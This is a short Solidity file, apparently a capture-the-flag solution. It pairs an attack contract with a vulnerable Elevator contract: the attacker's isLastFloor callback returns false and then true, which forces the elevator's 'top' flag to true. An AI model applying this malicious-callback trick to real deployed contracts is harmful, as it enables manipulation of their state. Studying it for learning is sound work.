// SPDX-License-Identifier: MIT

pragma solidity ^0.6.0;

contract AttackBuilding {
    uint s_counter;

    function isLastFloor(uint) external returns (bool) {
        if (s_counter == 0) {
            s_counter += 1;
            return false;
        } else {
            return true;
        }
    }

    function attack(address target) external {
        Elevator(target).goTo(1);
    }     
}

// source code
interface Building {
  function isLastFloor(uint) external returns (bool);
}


contract Elevator {
  bool public top;
  uint public floor;

  function goTo(uint _floor) public {
    Building building = Building(msg.sender);

    if (! building.isLastFloor(_floor)) {
      floor = _floor;
      top = building.isLastFloor(floor);
    }
  }
}